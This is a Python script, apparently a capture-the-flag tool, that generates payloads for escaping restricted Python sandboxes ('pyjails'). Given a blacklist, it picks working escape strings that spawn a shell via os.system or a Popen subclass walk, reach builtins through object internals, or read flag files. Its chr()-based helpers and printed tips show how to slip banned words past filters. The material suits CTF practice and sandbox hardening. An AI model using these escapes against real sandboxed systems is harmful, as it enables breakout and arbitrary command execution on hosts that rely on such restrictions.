#!/usr/bin/env python3
"""
Python-jail escape payload generator for CTF.

Given a blacklist of banned substrings, emit candidate escape payloads and mark
which ones avoid the blacklist. Also shows char-construction helpers to rebuild
banned words at runtime.

  pyjail_gen.py --blacklist "import,os,eval,exec,system" [--goal shell|read|rce]
  pyjail_gen.py --encode "os"          # how to build the string "os" without letters

Run with python -I.
"""
import argparse


PAYLOADS = [
    ("import os", "__import__('os').system('sh')"),
    ("subclasses->Popen",
     "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0](['sh'],shell=True)"),
    ("subclasses->catch_warnings->builtins",
     "[c for c in ().__class__.__base__.__subclasses__() if 'catch_warnings' in c.__name__][0]()"
     "._module.__builtins__['__import__']('os').system('sh')"),
    ("builtins via class", "().__class__.__base__.__subclasses__()"),
    ("globals of a func", "(lambda:0).__globals__"),
    ("breakpoint RCE", "breakpoint()"),
    ("fstring eval (3.8+)", "f'{__import__(\"os\").system(\"sh\")}'"),
    ("getattr chain", "getattr(getattr(__import__('builtins'),'__import__')('os'),'system')('sh')"),
    ("read file no import", "open('flag.txt').read()"),
    ("read via builtins", "__builtins__.open('flag.txt').read()"),
    ("help() escape", "help()  # then type a module name to browse, or ! for shell in pager"),
    ("input eval", "# if the jail does eval(input()): send payload directly"),
]


def contains_banned(s, banned):
    return [b for b in banned if b and b in s]


def char_construct(word):
    parts = ["chr(%d)" % ord(c) for c in word]
    return "+".join(parts)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--blacklist", default="")
    ap.add_argument("--goal", default="shell")
    ap.add_argument("--encode", default="")
    a = ap.parse_args()

    if a.encode:
        print("Rebuild %r without letters:" % a.encode)
        print("  " + char_construct(a.encode))
        print("  getattr(x, %s)  # use chr()-built attribute names" % char_construct(a.encode))
        return

    banned = [b.strip() for b in a.blacklist.replace(",", " ").split() if b.strip()]
    print("Blacklist: %s\n" % (banned or "(none)"))
    clean, blocked = [], []
    for name, p in PAYLOADS:
        hits = contains_banned(p, banned)
        (blocked if hits else clean).append((name, p, hits))

    print("=== CLEAN payloads (avoid your blacklist) ===")
    for name, p, _ in clean:
        print("• %-28s %s" % (name, p))
    if blocked:
        print("\n=== BLOCKED (contain banned tokens — rebuild those via chr()) ===")
        for name, p, hits in blocked:
            print("• %-28s banned:%s" % (name, ",".join(hits)))

    print("\nTips:")
    print("- Rebuild any banned word with chr()+chr()+… then use getattr()/__getattribute__.")
    print("- If letters are banned too: ().__class__ etc. use no letters you can also build via chr.")
    print("- If only builtins removed: recover via ().__class__.__base__.__subclasses__().")
    print("- Audit the exact filter: what EXACTLY is blocked (substring? ast? char set?) decides the bypass.")


if __name__ == "__main__":
    main()
